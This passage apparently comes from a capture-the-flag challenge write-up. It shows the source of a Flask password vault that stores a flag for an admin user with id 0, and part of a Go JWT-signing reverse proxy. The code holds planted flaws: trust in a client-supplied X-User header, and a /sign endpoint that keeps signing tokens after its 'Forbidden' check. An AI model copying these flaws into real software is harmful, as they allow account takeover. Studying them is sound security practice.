db.Column(db.DateTime, default=datetime.utcnow, nullable=<span class="literal">False</span>)</span><br><span class="line">    vault_entries = db.relationship(<span class="string">&#x27;VaultEntry&#x27;</span>, backref=<span class="string">&#x27;user&#x27;</span>, lazy=<span class="literal">True</span>, cascade=<span class="string">&#x27;all, delete-orphan&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VaultEntry</span>(db.Model):</span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    user_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;user.id&#x27;</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    label = db.Column(db.String(<span class="number">120</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    login = db.Column(db.String(<span class="number">120</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    password_encrypted = db.Column(db.Text, nullable=<span class="literal">False</span>)</span><br><span class="line">    notes = db.Column(db.Text)</span><br><span class="line">    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_password</span>(<span class="params">password: <span class="built_in">str</span>, salt: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    data = salt + password.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        data = hashlib.sha256(data).digest()</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_password</span>(<span class="params">password: <span class="built_in">str</span>, salt_b64: <span class="built_in">str</span>, digest: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    salt = base64.b64decode(salt_b64.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> hash_password(password, salt) == digest</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_salt</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> secrets.token_bytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_app</span>() -&gt; Flask:</span><br><span class="line">    app = Flask(__name__)</span><br><span class="line">    app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">    app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = os.getenv(<span class="string">&#x27;DATABASE_URL&#x27;</span>, <span class="string">&#x27;sqlite:///vault.db&#x27;</span>)</span><br><span class="line">    app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">    app.config[<span class="string">&#x27;SIGN_SERVER&#x27;</span>] = os.getenv(<span class="string">&#x27;SIGN_SERVER&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:4444/sign&#x27;</span>)</span><br><span class="line">    fernet_key = os.getenv(<span class="string">&#x27;FERNET_KEY&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fernet_key:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Missing FERNET_KEY environment variable. Generate one with `python -c &quot;from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())&quot;`.&#x27;</span>)</span><br><span class="line">    app.config[<span class="string">&#x27;FERNET_KEY&#x27;</span>] = fernet_key</span><br><span class="line">    db.init_app(app)</span><br><span class="line"></span><br><span class="line">    fernet = Fernet(app.config[<span class="string">&#x27;FERNET_KEY&#x27;</span>])</span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> User.query.first():</span><br><span class="line">            salt = secrets.token_bytes(<span class="number">16</span>)</span><br><span class="line">            password = secrets.token_bytes(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line">            password_hash = hash_password(password, salt)</span><br><span class="line">            user = User(</span><br><span class="line">                <span class="built_in">id</span>=<span class="number">0</span>,</span><br><span class="line">                username=<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">                password_hash=password_hash,</span><br><span class="line">                salt=base64.b64encode(salt).decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">            )</span><br><span class="line">            db.session.add(user)</span><br><span class="line">            db.session.commit()</span><br><span class="line"></span><br><span class="line">            flag = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read().strip()</span><br><span class="line">            flagEntry = VaultEntry(</span><br><span class="line">                user_id=user.<span class="built_in">id</span>,</span><br><span class="line">                label=<span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                login=<span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                password_encrypted=fernet.encrypt(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">                notes=<span class="string">&#x27;This is the flag entry.&#x27;</span>,</span><br><span class="line">            )</span><br><span class="line">            db.session.add(flagEntry)</span><br><span class="line">            db.session.commit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">view_func</span>):</span><br><span class="line"><span class="meta">        @wraps(<span class="params">view_func</span>)</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">wrapped</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            uid = request.headers.get(<span class="string">&#x27;X-User&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(uid)</span><br><span class="line">            <span class="keyword">if</span> uid == <span class="string">&#x27;anonymous&#x27;</span>:</span><br><span class="line">                flash(<span class="string">&#x27;Please sign in first.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                uid_int = <span class="built_in">int</span>(uid)</span><br><span class="line">            <span class="keyword">except</span> (TypeError, ValueError):</span><br><span class="line">                flash(<span class="string">&#x27;Invalid session. Please sign in again.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">            user = User.query.filter_by(<span class="built_in">id</span>=uid_int).first()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">                flash(<span class="string">&#x27;User not found. Please sign in again.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            g.current_user = user</span><br><span class="line">            <span class="keyword">return</span> view_func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> wrapped</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">        uid = request.headers.get(<span class="string">&#x27;X-User&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> uid <span class="keyword">or</span> uid == <span class="string">&#x27;anonymous&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            username = request.form.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">            password = request.form.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            confirm_password = request.form.get(<span class="string">&#x27;confirm_password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">                flash(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> password != confirm_password:</span><br><span class="line">                flash(<span class="string">&#x27;Passwords do not match.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            salt = generate_salt()</span><br><span class="line">            password_hash = hash_password(password, salt)</span><br><span class="line">            user = User(</span><br><span class="line">                username=username,</span><br><span class="line">                password_hash=password_hash,</span><br><span class="line">                salt=base64.b64encode(salt).decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">            )</span><br><span class="line">            db.session.add(user)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                db.session.commit()</span><br><span class="line">            <span class="keyword">except</span> IntegrityError:</span><br><span class="line">                db.session.rollback()</span><br><span class="line">                flash(<span class="string">&#x27;Username already exists. Please choose another.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            flash(<span class="string">&#x27;Registration successful. Please sign in.&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            username = request.form.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">            password = request.form.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            user = User.query.filter_by(username=username).first()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> <span class="keyword">not</span> verify_password(password, user.salt, user.password_hash):</span><br><span class="line">                flash(<span class="string">&#x27;Invalid username or password.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">            r = requests.get(app.config[<span class="string">&#x27;SIGN_SERVER&#x27;</span>], params=&#123;<span class="string">&#x27;uid&#x27;</span>: user.<span class="built_in">id</span>&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">                flash(<span class="string">&#x27;Unable to reach the authentication server. Please try again later.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            token = r.text.strip()</span><br><span class="line">            response = make_response(redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>)))</span><br><span class="line">            response.set_cookie(</span><br><span class="line">                <span class="string">&#x27;token&#x27;</span>,</span><br><span class="line">                token,</span><br><span class="line">                httponly=<span class="literal">True</span>,</span><br><span class="line">                secure=app.config.get(<span class="string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>, <span class="literal">False</span>),</span><br><span class="line">                samesite=<span class="string">&#x27;Lax&#x27;</span>,</span><br><span class="line">                max_age=<span class="number">12</span> * <span class="number">3600</span>,</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">        response = make_response(redirect(url_for(<span class="string">&#x27;login&#x27;</span>)))</span><br><span class="line">        response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        flash(<span class="string">&#x27;Signed out.&#x27;</span>, <span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">    @login_required</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">        user = g.current_user</span><br><span class="line">        entries = [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: entry.<span class="built_in">id</span>,</span><br><span class="line">                <span class="string">&#x27;label&#x27;</span>: entry.label,</span><br><span class="line">                <span class="string">&#x27;login&#x27;</span>: entry.login,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: fernet.decrypt(entry.password_encrypted.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">                <span class="string">&#x27;notes&#x27;</span>: entry.notes,</span><br><span class="line">                <span class="string">&#x27;created_at&#x27;</span>: entry.created_at,</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> entry <span class="keyword">in</span> user.vault_entries</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, username=user.username, entries=entries)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/passwords/new&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">    @login_required</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_password</span>():</span><br><span class="line">        user = g.current_user</span><br><span class="line">        label = request.form.get(<span class="string">&#x27;label&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        login_value = request.form.get(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        password_plain = request.form.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        notes = request.form.get(<span class="string">&#x27;notes&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip() <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> label <span class="keyword">or</span> <span class="keyword">not</span> login_value <span class="keyword">or</span> <span class="keyword">not</span> password_plain:</span><br><span class="line">            flash(<span class="string">&#x27;Service name, login, and password are required.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">        encrypted_password = fernet.encrypt(password_plain.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        entry = VaultEntry(</span><br><span class="line">            user_id=user.<span class="built_in">id</span>,</span><br><span class="line">            label=label,</span><br><span class="line">            login=login_value,</span><br><span class="line">            password_encrypted=encrypted_password,</span><br><span class="line">            notes=notes,</span><br><span class="line">        )</span><br><span class="line">        db.session.add(entry)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;Password entry saved.&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/passwords/&lt;int:entry_id&gt;&#x27;</span>, methods=[<span class="string">&#x27;DELETE&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">    @login_required</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete_password</span>(<span class="params">entry_id: <span class="built_in">int</span></span>):</span><br><span class="line">        user = g.current_user</span><br><span class="line">        entry = VaultEntry.query.filter_by(<span class="built_in">id</span>=entry_id, user_id=user.<span class="built_in">id</span>).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> entry:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Entry not found&#x27;</span>&#125;), <span class="number">404</span></span><br><span class="line">        db.session.delete(entry)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> app</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flask_app = create_app()</span><br><span class="line">    flask_app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>main.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http/httputil&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/golang-jwt/jwt/v5&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	SecretKey = hex.EncodeToString(RandomBytes(<span class="number">32</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> AuthClaims <span class="keyword">struct</span> &#123;</span><br><span class="line">	jwt.RegisteredClaims</span><br><span class="line">	UID <span class="type">string</span> <span class="string">`json:&quot;uid&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RandomBytes</span><span class="params">(length <span class="type">int</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="type">byte</span>, length)</span><br><span class="line">	<span class="keyword">if</span> _, err := rand.Read(b); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SignToken</span><span class="params">(uid <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	t := jwt.NewWithClaims(jwt.SigningMethodHS256, AuthClaims&#123;</span><br><span class="line">		UID: uid,</span><br><span class="line">		RegisteredClaims: jwt.RegisteredClaims&#123;</span><br><span class="line">			Issuer:    <span class="string">&quot;Authorizer&quot;</span>,</span><br><span class="line">			Subject:   uid,</span><br><span class="line">			ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)),</span><br><span class="line">			IssuedAt:  jwt.NewNumericDate(time.Now()),</span><br><span class="line">			NotBefore: jwt.NewNumericDate(time.Now()),</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;)</span><br><span class="line">	tokenString, err := t.SignedString([]<span class="type">byte</span>(SecretKey))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> tokenString, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetUIDFromRequest</span><span class="params">(r *http.Request)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	authHeader := r.Header.Get(<span class="string">&quot;Authorization&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> authHeader == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		cookie, err := r.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">			authHeader = <span class="string">&quot;Bearer &quot;</span> + cookie.Value</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(authHeader) &lt;= <span class="number">7</span> || !strings.HasPrefix(authHeader, <span class="string">&quot;Bearer &quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	tokenString := strings.TrimSpace(authHeader[<span class="number">7</span>:])</span><br><span class="line">	<span class="keyword">if</span> tokenString == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	token, err := jwt.ParseWithClaims(tokenString, &amp;AuthClaims&#123;&#125;, <span class="function"><span class="keyword">func</span><span class="params">(token *jwt.Token)</span></span> (<span class="keyword">interface</span>&#123;&#125;, <span class="type">error</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;unexpected signing method: %v&quot;</span>, token.Header[<span class="string">&quot;alg&quot;</span>])</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> []<span class="type">byte</span>(SecretKey), <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Printf(<span class="string">&quot;failed to parse token: %v&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	claims, ok := token.Claims.(*AuthClaims)</span><br><span class="line">	<span class="keyword">if</span> !ok || !token.Valid &#123;</span><br><span class="line">		log.Printf(<span class="string">&quot;invalid token claims&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> claims.UID</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	authorizer := &amp;httputil.ReverseProxy&#123;Director: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request)</span></span> &#123;</span><br><span class="line">		req.URL.Scheme = <span class="string">&quot;http&quot;</span></span><br><span class="line">		req.URL.Host = <span class="string">&quot;127.0.0.1:5000&quot;</span></span><br><span class="line"></span><br><span class="line">		uid := GetUIDFromRequest(req)</span><br><span class="line">		log.Printf(<span class="string">&quot;Request UID: %s, URL: %s&quot;</span>, uid, req.URL.String())</span><br><span class="line">		req.Header.Del(<span class="string">&quot;Authorization&quot;</span>)</span><br><span class="line">		req.Header.Del(<span class="string">&quot;X-User&quot;</span>)</span><br><span class="line">		req.Header.Del(<span class="string">&quot;X-Forwarded-For&quot;</span>)</span><br><span class="line">		req.Header.Del(<span class="string">&quot;Cookie&quot;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			req.Header.Set(<span class="string">&quot;X-User&quot;</span>, <span class="string">&quot;anonymous&quot;</span>)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			req.Header.Set(<span class="string">&quot;X-User&quot;</span>, uid)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;&#125;</span><br><span class="line"></span><br><span class="line">	signRouter := mux.NewRouter()</span><br><span class="line">	signRouter.HandleFunc(<span class="string">&quot;/sign&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> !strings.HasPrefix(r.RemoteAddr, <span class="string">&quot;127.0.0.1:&quot;</span>) &#123;</span><br><span class="line">			http.Error(w, <span class="string">&quot;Forbidden&quot;</span>, http.StatusForbidden)</span><br><span class="line">		&#125;</span><br><span class="line">		uid := r.URL.Query().Get(<span class="string">&quot;uid&quot;</span>)</span><br><span class="line">		token, err := SignToken(uid)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Printf(<span class="string">&quot;Failed to sign token: %v&quot;</span>, err)</span><br><span class="line">			http.Error(w, <span class="string">&quot;Failed to generate token&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		w.Write([]<span class="type">byte</span>(token))</span><br><span class="line">	&#125;).Methods(<span 